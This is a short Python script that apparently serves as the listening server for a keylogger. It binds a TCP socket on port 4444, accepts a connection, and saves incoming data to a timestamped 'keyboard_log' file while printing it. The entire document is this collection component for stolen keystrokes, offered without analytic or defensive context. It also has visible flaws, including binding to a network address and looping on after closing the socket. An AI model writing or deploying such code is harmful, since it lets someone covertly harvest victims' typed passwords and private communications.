import socket
import datetime
import time

HOST = "192.168.1.0"
PORT = 4444
ATTEMPTS = 0
CONNECTED = False

log_name = datetime.datetime.now().strftime(
    "keyboard_log_%Y%m%d_%H%M%S.txt"
)

print(f"[+] Writing log to {log_name}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    if (not CONNECTED):

        try:
            s.bind((HOST, PORT))
            s.listen(1)
            print(f"[+] Listening on {HOST}:{PORT}")
        except Exception:
            print("[+] Failed to start listener.")
            

    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    with conn, open(log_name, "a", encoding="utf-8") as f:
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
            
                text = data.decode("utf-8", errors="replace")
                print(text)
                f.write(text)
                f.flush()
            except Exception:
                s.close()
                print(f"[+] Connection closed, log saved as {log_name}.")
